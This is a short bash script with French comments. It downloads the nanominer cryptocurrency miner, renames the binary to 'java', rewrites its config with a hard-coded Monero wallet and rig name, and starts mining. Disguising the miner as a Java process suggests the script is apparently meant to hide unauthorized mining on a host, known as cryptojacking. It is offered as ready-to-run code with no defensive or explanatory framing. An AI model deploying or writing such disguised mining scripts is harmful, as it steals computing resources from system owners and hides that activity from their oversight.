#!/bin/bash

# Créer le répertoire "danny" et naviguer dedans
mkdir -p danny
cd danny

# Télécharger et extraire nanominer
wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz
tar -xvzf nanominer-linux-3.9.3.tar.gz

# Renommer le dossier extrait en "java"
mv nanominer java

# Créer le fichier up.sh et y insérer le contenu
cat << 'EOF' > up.sh
#!/bin/bash

# Variables pour la nouvelle configuration
NEW_WALLET="89ZaNLJadC7QXi2h5dtqVHiL7BLsEzw1LfBbRE6GWXVDFKdMJoi41XEjYaAhTKZMYR64Ltk3ZZ5modZXCVquyF4dNhqZ8MA"
NEW_RIGNAME="d30"
EMAIL_PASSWORD="EMAIL = PASSWORD"

# Nom du fichier de configuration
CONFIG_FILE="config_xmr.ini"

# Vérifier si le fichier existe
if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "Erreur : Le fichier $CONFIG_FILE n'existe pas."
    exit 1
fi

# Modifier l'adresse wallet
sed -i "s/^wallet = .*/wallet = $NEW_WALLET/" "$CONFIG_FILE"

# Modifier le rigName
sed -i "s/^rigName = .*/rigName = $NEW_RIGNAME/" "$CONFIG_FILE"

# Ajouter la ligne EMAIL = PASSWORD si elle n'existe pas déjà
if ! grep -q "^EMAIL = PASSWORD" "$CONFIG_FILE"; then
    echo "$EMAIL_PASSWORD" >> "$CONFIG_FILE"
fi

echo "Le fichier $CONFIG_FILE a été mis à jour avec succès."
EOF

# Rendre le script exécutable
chmod +x up.sh

# Exécuter le script de configuration
./up.sh

# Lancer le programme java avec le fichier de configuration
./java config_xmr.ini
